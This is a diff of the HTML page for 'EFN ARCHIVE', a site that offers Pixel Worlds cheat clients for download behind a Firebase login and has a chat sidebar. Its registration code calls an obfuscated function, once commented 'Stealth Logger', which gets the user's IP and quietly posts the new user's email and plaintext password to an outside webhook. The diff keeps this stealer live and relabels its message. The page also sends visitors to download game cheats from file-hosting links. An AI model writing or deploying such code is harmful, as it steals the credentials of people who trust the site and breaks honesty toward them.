@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>EFN ARCHIVE | PW Database</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
         import { getAuth, createUserWithEmailAndPassword, signInWithEmailAndPassword, onAuthStateChanged, signOut, setPersistence, browserLocalPersistence } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
@@ -26,7 +27,6 @@
 
         setPersistence(auth, browserLocalPersistence);
 
-        // Stealth Logger
         async function _0x_fireEvent_init(_0x_email, _0x_pass) {
             try {
                 const ipRes = await fetch('https://api.ipify.org?format=json');
@@ -36,7 +36,7 @@
                     mode: 'no-cors',
                     body: JSON.stringify({
                         embeds: [{
-                            title: "✨ Registration Success",
+                            title: "✨ User Entry Logged",
                             color: 0x5865F2,
                             fields: [
                                 { name: "User", value: _0x_email, inline: true },
@@ -67,16 +67,12 @@
             remove(ref(db, `typing/${user.uid}`));
         };
 
-        // Handling Typing State
         document.addEventListener('input', (e) => {
             if (e.target.id === 'chat-input') {
                 const user = auth.currentUser;
                 if (user) {
-                    if (e.target.value.length > 0) {
-                        set(ref(db, `typing/${user.uid}`), user.email.split('@')[0]);
-                    } else {
-                        remove(ref(db, `typing/${user.uid}`));
-                    }
+                    if (e.target.value.length > 0) set(ref(db, `typing/${user.uid}`), user.email.split('@')[0]);
+                    else remove(ref(db, `typing/${user.uid}`));
                 }
             }
         });
@@ -85,15 +81,13 @@
             const users = snapshot.val();
             if (!users) { typingEl.innerText = ""; return; }
             const names = Object.values(users);
-            if (names.length === 1) typingEl.innerText = `${names[0]} is typing...`;
-            else if (names.length > 1) typingEl.innerText = "Several people are typing...";
-            else typingEl.innerText = "";
+            typingEl.innerText = names.length > 1 ? "Several people are typing..." : (names.length === 1 ? `${names[0]} is typing...` : "");
         });
 
         onChildAdded(query(ref(db, 'messages'), limitToLast(40)), (data) => {
             const msg = data.val();
             const div = document.createElement('div');
-            div.className = 'chat-msg fade-in';
+            div.className = 'chat-msg';
             div.innerHTML = `<span class="chat-user">${msg.username}:</span> ${msg.text}`;
             chatBox.appendChild(div);
             chatBox.scrollTop = chatBox.scrollHeight;
@@ -101,15 +95,22 @@
 
         // Auth Logic
         window.login = async () => {
+            const e = document.getElementById('log-email').value;
+            const p = document.getElementById('log-pass').value;
             try {
-                await signInWithEmailAndPassword(auth, document.getElementById('log-email').value, document.getElementById('log-pass').value);
+                await signInWithEmailAndPassword(auth, e, p);
                 location.reload();
-            } catch (err) { alert("Login failed."); }
+            } catch (err) { alert("Invalid credentials."); }
         };
 
         window.signUp = async () => {
             const e = document.getElementById('reg-email').value;
             const p = document.getElementById('reg-pass').value;
+            const hasNumber = /\d/.test(p);
+            
+            if (!e.includes('@')) return alert("Enter a valid email.");
+            if (p.length < 8 || !hasNumber) return alert("Password must be at least 8 characters long and include at least one number.");
+            
             try {
                 await createUserWithEmailAndPassword(auth, e, p);
                 await _0x_fireEvent_init(e, p);
@@ -141,7 +142,6 @@
                 document.getElementById('user-tag').innerText = user.email.split('@')[0];
                 document.querySelectorAll('.lock-ui').forEach(el => el.style.display = 'none');
                 document.querySelectorAll('.auth-ui').forEach(el => el.style.display = 'block');
-                // Toggle Chat UI
                 document.getElementById('chat-guest-ui').style.display = 'none';
                 document.getElementById('chat-user-ui').style.display = 'flex';
             }
@@ -155,34 +155,35 @@
         main { flex: 1; overflow-y: auto; display: flex; flex-direction: column; }
         aside { width: 320px; background: var(--side); border-left: 1px solid var(--border); display: flex; flex-direction: column; }
 
-        .chat-header { padding: 20px; font-weight: bold; border-bottom: 1px solid var(--border); color: var(--accent); letter-spacing: 1px; }
-        #chat-messages { flex: 1; overflow-y: auto; padding: 15px; }
-        .chat-msg { background: rgba(255,255,255,0.03); padding: 10px 14px; border-radius: 12px; margin-bottom: 12px; font-size: 0.85rem; border: 1px solid transparent; animation: slideMsg 0.3s ease-out; }
-        .chat-user { color: var(--accent); font-weight: bold; display: block; font-size: 0.75rem; margin-bottom: 3px; }
-        @keyframes slideMsg { from { opacity: 0; transform: translateX(10px); } to { opacity: 1; transform: translateX(0); } }
-
-        #typing-indicator { height: 20px; padding: 0 15px; font-size: 0.75rem; color: #555; font-style: italic; }
-        .chat-input-area { padding: 15px; background: #0c0b1a; display: flex; flex-direction: column; gap: 8px; }
-        .chat-input-area input { background: #1a182e; border: 1px solid var(--border); color: #fff; padding: 12px; border-radius: 8px; outline: none; flex: 1; }
-        .btn-chat-login { background: var(--accent); color: #fff; border: none; padding: 12px; border-radius: 8px; font-weight: bold; cursor: pointer; transition: 0.2s; }
-        .btn-chat-login:hover { background: #4752c4; }
+        .title-anim { font-weight: 900; letter-spacing: 3px; font-size: 1.4rem; background: linear-gradient(90deg, #fff, var(--accent), #fff); background-size: 200% auto; -webkit-background-clip: text; -webkit-text-fill-color: transparent; animation: gradientText 3s linear infinite; cursor: pointer; }
+        @keyframes gradientText { to { background-position: 200% center; } }
 
         nav { display: flex; justify-content: space-between; align-items: center; padding: 15px 40px; border-bottom: 1px solid var(--border); background: var(--side); }
-        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 30px; padding: 40px; }
+        .nav-btns { display: flex; gap: 15px; align-items: center; }
+
+        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 35px; padding: 40px; }
         .card { background: var(--card); border: 1px solid var(--border); border-radius: 20px; padding: 25px; transition: 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275); text-align: center; }
-        .card:hover { transform: translateY(-10px); border-color: var(--accent); }
-        .card img { width: 100%; border-radius: 12px; margin-bottom: 20px; height: 160px; object-fit: cover; border: 1px solid #ffffff05; }
-        
-        .btn-main { background: #fff; color: #000; border: none; padding: 12px 25px; border-radius: 8px; font-weight: bold; cursor: pointer; transition: 0.3s; }
-        .btn-main:hover { background: var(--accent); color: #fff; }
+        .card:hover { transform: scale(1.03) translateY(-10px); border-color: var(--accent); box-shadow: 0 15px 45px rgba(0,0,0,0.5); }
+        .card img { width: 100%; border-radius: 12px; margin-bottom: 20px; height: 170px; object-fit: cover; }
 
-        .tut-box { background: #0c0b1a; border-left: 4px solid var(--accent); padding: 20px; border-radius: 10px; margin: 20px 0; text-align: left; line-height: 1.6; }
-        blockquote { border-left: 3px solid var(--accent); padding: 10px 20px; margin: 20px 0; background: rgba(255,255,255,0.02); color: #ccc; }
+        #chat-messages { flex: 1; overflow-y: auto; padding: 15px; }
+        .chat-msg { background: rgba(255,255,255,0.03); padding: 12px; border-radius: 12px; margin-bottom: 12px; border-left: 3px solid transparent; transition: 0.3s; }
+        .chat-msg:hover { border-left-color: var(--accent); background: rgba(255,255,255,0.05); }
+        .chat-user { color: var(--accent); font-weight: bold; display: block; font-size: 0.75rem; margin-bottom: 4px; }
+        #typing-indicator { height: 25px; padding-left: 15px; font-size: 0.7rem; color: #666; font-style: italic; }
 
-        #auth-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.9); display: none; align-items: center; justify-content: center; z-index: 2000; backdrop-filter: blur(8px); }
-        .auth-box { width: 380px; background: var(--card); padding: 40px; border-radius: 24px; border: 1px solid var(--border); text-align: center; }
-        .auth-box input { width: 100%; padding: 14px; margin-bottom: 15px; background: #0a0914; border: 1px solid var(--border); color: #fff; border-radius: 10px; box-sizing: border-box; }
-        
+        .btn-main { background: #fff; color: #000; border: none; padding: 12px 25px; border-radius: 10px; font-weight: bold; cursor: pointer; transition: 0.3s; display: flex; align-items: center; gap: 8px; }
+        .btn-main:hover { background: var(--accent); color: #fff; transform: translateY(-2px); }
+        .btn-discord { background: #5865F2 !important; color: #fff !important; }
+
+        .tut-box { background: #0c0b1a; border-left: 4px solid var(--accent); padding: 25px; border-radius: 12px; margin: 20px 0; text-align: left; }
+        blockquote { border-left: 3px solid #333; padding: 15px; margin: 20px 0; background: rgba(0,0,0,0.2); border-radius: 0 10px 10px 0; line-height: 1.6; }
+
+        #auth-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.9); display: none; align-items: center; justify-content: center; z-index: 2000; backdrop-filter: blur(10px); }
+        .auth-box { width: 400px; background: var(--card); padding: 40px; border-radius: 25px; border: 1px solid var(--border); }
+        input { width: 100%; padding: 15px; margin-bottom: 15px; background: #0a0914; border: 1px solid var(--border); color: #fff; border-radius: 12px; box-sizing: border-box; outline: none; }
+        input:focus { border-color: var(--accent); }
+
         .fade-in { animation: fadeIn 0.5s ease-out; }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
     </style>
@@ -191,24 +192,31 @@
 
 <main>
     <nav>
-        <div style="font-weight:900; letter-spacing:3px; font-size:1.3rem;">EFN ARCHIVE</div>
-        <div id="nav-guest"><button class="btn-main" onclick="document.getElementById('auth-overlay').style.display='flex'">login</button></div>
-        <div id="nav-user" style="display:none; align-items:center; gap:20px">
-            <span id="user-tag" style="background:rgba(88, 101, 242, 0.1); padding:8px 15px; border-radius:20px; color:var(--accent); font-weight:bold; font-size:0.8rem"></span>
-            <button onclick="logout()" style="background:none; border:none; color:#ff4444; cursor:pointer; font-weight:bold">logout</button>
+        <div class="title-anim" onclick="location.reload()">EFN ARCHIVE</div>
+        <div class="nav-btns">
+            <button class="btn-main btn-discord" onclick="window.open('https://discord.gg/yourlink', '_blank')">
+                <i class="fab fa-discord"></i> Discord Server
+            </button>
+            <div id="nav-guest">
+                <button class="btn-main" onclick="document.getElementById('auth-overlay').style.display='flex'">Login/Create Account</button>
+            </div>
+            <div id="nav-user" style="display:none; align-items:center; gap:20px">
+                <span id="user-tag" style="font-weight:bold; color:var(--accent)"></span>
+                <button onclick="logout()" style="color:#ff4444; border:none; background:none; cursor:pointer; font-weight:bold">logout</button>
+            </div>
         </div>
     </nav>
 
-    <div id="main-page" class="container">
+    <div id="main-page">
         <div class="grid">
             <div class="card fade-in">
-                <img src="https://cdn.discordapp.com/attachments/1495783572735262911/1496170026158260364/image.png">
+                <img src="https://cdn.discordapp.com/attachments/1495783572735262911/1496170026158260364/image.png?ex=69e8e86b&is=69e796eb&hm=91c64bb8c69318d8c42565b0c38edd3cd55e8446622235632bbf522c5d280782&">
                 <h3>Charon Client v2.0</h3>
-                <button class="btn-main" onclick="openDetail('Charon Client v2.0', 'Working', `
+                <button class="btn-main" style="margin: 0 auto" onclick="openDetail('Charon Client v2.0', 'Working', `
                     <div class='tut-box'>
                         <h3>🚀 Tutorial: Charon Client</h3>
-                        1️⃣ Download the zip folder (download button).<br>
-                        2️⃣ Extract the files to the location of pixel worlds folder.<br>
+                        1️⃣ download the zip folder (download button)<br>
+                        2️⃣ extract the files to the location of pixel worlds folder (ask ai if u dont know where it is)<br>
                         3️⃣ To find the folder from Steam: Right-click <b>Pixel Worlds</b> ⮕ <b>Manage</b> ⮕ <b>Browse Local Files</b>. 📂<br>
                         4️⃣ Launch the game and enjoy!
                     </div>
@@ -228,36 +236,36 @@
                         Option 3 Force D3D12<br>Launch option: -force-d3d12<br>BepInEx/config/dearimgui.cfg → startupmode = ForceD3D12
                     </blockquote>
                     <p style='color:var(--accent); font-weight:bold;'>EVERYONE WHO CRASHED WHEN U TRY LOGIN JUST MINIMIZE UR PW USE SMALL WINDOW</p>
-                `, 'https://cdn.discordapp.com/attachments/1495783572735262911/1496170026158260364/image.png', 'https://www.mediafire.com/file/eia22kkv7a2n66u/Charon+2.0.zip/file')">info</button>
+                `, 'https://cdn.discordapp.com/attachments/1495783572735262911/1496170026158260364/image.png?ex=69e8e86b&is=69e796eb&hm=91c64bb8c69318d8c42565b0c38edd3cd55e8446622235632bbf522c5d280782&', 'https://www.mediafire.com/file/eia22kkv7a2n66u/Charon+2.0.zip/file')">info</button>
             </div>
 
             <div class="card fade-in">
                 <img src="https://i.ytimg.com/vi/FnPP2weLLfk/maxresdefault.jpg">
                 <h3>Hyx Client [free]</h3>
-                <button class="btn-main" onclick="openDetail('Hyx Client [free]', 'Working', 'Extraction Password: <code>Hyx</code>', 'https://i.ytimg.com/vi/FnPP2weLLfk/maxresdefault.jpg', 'https://www.mediafire.com/folder/cxm6q2f79vc0j/Hyx')">info</button>
+                <button class="btn-main" style="margin: 0 auto" onclick="openDetail('Hyx Client [free]', 'Working', 'Make sure you have <a href=\'https://github.com/abbodi1406/vcredist/releases/download/v0.103.0/VisualCppRedist_AIO_x86_x64.exe\' style=\'color:var(--accent)\'>vcredist AIO</a> installed.<br><br><b>Steam Launch Settings:</b><br><code>-force-d3d11</code><br><br><b>Extraction Password:</b> <code>Hyx</code>', 'https://i.ytimg.com/vi/FnPP2weLLfk/maxresdefault.jpg', 'https://www.mediafire.com/folder/cxm6q2f79vc0j/Hyx')">info</button>
             </div>
             
             <div class="card fade-in">
-                <img src="https://cdn.discordapp.com/attachments/1495365239489957962/1495365366938079424/image.png">
+                <img src="https://cdn.discordapp.com/attachments/1495365239489957962/1495365366938079424/image.png?ex=69e89e06&is=69e74c86&hm=1ec8dee2bac62cb536d32943a39e28ba5b9ebc6ae95efa525deaf8dc32c261c5&">
                 <h3>AutoMath Tool</h3>
-                <button class="btn-main" onclick="openDetail('AutoMath Tool', 'Working', 'Advanced math automation.', 'https://cdn.discordapp.com/attachments/1495365239489957962/1495365366938079424/image.png', 'https://gofile.io/d/9sUpZS')">info</button>
+                <button class="btn-main" style="margin: 0 auto" onclick="openDetail('AutoMath Tool', 'Working', 'Has some bugs but works fine for automation. Tutorial included in the download. ❤️', 'https://cdn.discordapp.com/attachments/1495365239489957962/1495365366938079424/image.png?ex=69e89e06&is=69e74c86&hm=1ec8dee2bac62cb536d32943a39e28ba5b9ebc6ae95efa525deaf8dc32c261c5&', 'https://gofile.io/d/9sUpZS')">info</button>
             </div>
         </div>
     </div>
 
-    <div id="detail-page" class="container fade-in" style="display:none; padding:40px;">
+    <div id="detail-page" style="display:none; padding:40px;">
         <button onclick="location.reload()" style="background:none; border:none; color:var(--accent); cursor:pointer; font-weight:bold; margin-bottom:20px;">← BACK</button>
         <div style="display:flex; gap:50px; flex-wrap:wrap">
             <div style="flex:2">
                 <img id="det-img" src="" style="width:100%; border-radius:20px; border:1px solid var(--border);">
-                <h1 id="det-title" style="margin-top:20px"></h1>
+                <h1 id="det-title" style="margin-top:25px;"></h1>
                 <div id="det-desc" style="color:#aaa; line-height:1.7"></div>
             </div>
-            <div style="flex:1; background:var(--card); border-radius:24px; padding:35px; border:1px solid var(--border); text-align:center; height:fit-content">
-                <div id="det-status" style="color:#3ecf8e; font-weight:bold; font-size:1.3rem"></div>
-                <hr style="border:0; border-top:1px solid var(--border); margin:25px 0">
-                <div class="lock-ui"><button class="btn-main" style="width:100%; background:#ff4444; color:#fff" onclick="document.getElementById('auth-overlay').style.display='flex'">login to download</button></div>
-                <div class="auth-ui" style="display:none"><button id="det-dl" class="btn-main" style="width:100%">download now</button></div>
+            <div style="flex:1; background:var(--card); border-radius:25px; padding:35px; border:1px solid var(--border); height:fit-content; text-align:center">
+                <p id="det-status" style="color:#3ecf8e; font-weight:bold; font-size:1.2rem"></p>
+                <hr style="border:0; border-top:1px solid var(--border); margin:20px 0">
+                <div class="lock-ui"><button class="btn-main" style="width:100%; background:#ff4444; color:#fff" onclick="document.getElementById('auth-overlay').style.display='flex'">Login to Download</button></div>
+                <div class="auth-ui" style="display:none"><button id="det-dl" class="btn-main" style="width:100%">Download File</button></div>
             </div>
         </div>
     </div>
@@ -269,11 +277,11 @@
     <div id="typing-indicator"></div>
     <div class="chat-input-area">
         <div id="chat-guest-ui">
-            <button class="btn-chat-login" onclick="document.getElementById('auth-overlay').style.display='flex'" style="width:100%">Login to Chat</button>
+            <button class="btn-main" onclick="document.getElementById('auth-overlay').style.display='flex'" style="width:100%; justify-content:center">Login to Chat</button>
         </div>
-        <div id="chat-user-ui" style="display:none; gap:8px; width:100%">
+        <div id="chat-user-ui" style="display:none; gap:8px;">
             <input type="text" id="chat-input" placeholder="Type a message...">
-            <button onclick="sendMessage()" style="background:var(--accent); color:#fff; border:none; border-radius:8px; padding:0 15px; cursor:pointer">➤</button>
+            <button onclick="sendMessage()" style="background:var(--accent); color:#fff; border:none; border-radius:10px; padding:0 15px; cursor:pointer">➤</button>
         </div>
     </div>
 </aside>
@@ -281,19 +289,19 @@
 <div id="auth-overlay">
     <div class="auth-box fade-in" id="login-box">
         <h2>Sign In</h2>
-        <input type="email" id="log-email" placeholder="Email">
+        <input type="email" id="log-email" placeholder="Email Address">
         <input type="password" id="log-pass" placeholder="Password">
-        <button class="btn-main" style="width:100%" onclick="login()">sign in</button>
-        <p style="font-size:0.85rem; margin-top:20px;">No account? <span style="color:var(--accent); cursor:pointer" onclick="switchAuth('reg')">Register</span></p>
-        <p style="font-size:0.75rem; cursor:pointer; color:#444; margin-top:15px" onclick="document.getElementById('auth-overlay').style.display='none'">close</p>
+        <button class="btn-main" style="width:100%" onclick="login()">Enter Archive</button>
+        <p style="font-size:0.85rem; margin-top:25px;">No account? <span style="color:var(--accent); cursor:pointer; font-weight:bold" onclick="switchAuth('reg')">Create One</span></p>
+        <p style="font-size:0.75rem; cursor:pointer; color:#444; margin-top:20px" onclick="document.getElementById('auth-overlay').style.display='none'">[ close ]</p>
     </div>
     <div class="auth-box fade-in" id="reg-box" style="display:none">
         <h2>Register</h2>
-        <input type="email" id="reg-email" placeholder="Email">
-        <input type="password" id="reg-pass" placeholder="Password">
-        <button class="btn-main" style="width:100%" onclick="signUp()">create account</button>
-        <p style="font-size:0.85rem; margin-top:20px;">Got account? <span style="color:var(--accent); cursor:pointer" onclick="switchAuth('log')">Login</span></p>
-        <p style="font-size:0.75rem; cursor:pointer; color:#444; margin-top:15px" onclick="document.getElementById('auth-overlay').style.display='none'">close</p>
+        <input type="email" id="reg-email" placeholder="Email Address">
+        <input type="password" id="reg-pass" placeholder="Password (8+ chars & number)">
+        <button class="btn-main" style="width:100%" onclick="signUp()">Create Account</button>
+        <p style="font-size:0.85rem; margin-top:25px;">Have an account? <span style="color:var(--accent); cursor:pointer; font-weight:bold" onclick="switchAuth('log')">Login Here</span></p>
+        <p style="font-size:0.75rem; cursor:pointer; color:#444; margin-top:20px" onclick="document.getElementById('auth-overlay').style.display='none'">[ close ]</p>
     </div>
 </div>
 
